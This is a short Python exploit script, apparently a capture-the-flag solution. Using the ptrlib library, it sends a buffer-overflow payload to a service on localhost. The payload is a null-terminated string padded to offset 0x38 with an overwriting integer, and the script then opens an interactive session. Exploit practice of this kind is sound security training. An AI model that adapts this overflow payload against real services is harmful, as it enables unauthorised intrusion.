from ptrlib import *

sock = Socket("localhost", 9004)

payload = b'Hopes\x00'
payload += b'A' * (0x38 - len(payload))
payload += p32(12345)

sock.sendline(payload)

sock.sendline("Y")

sock.interactive()
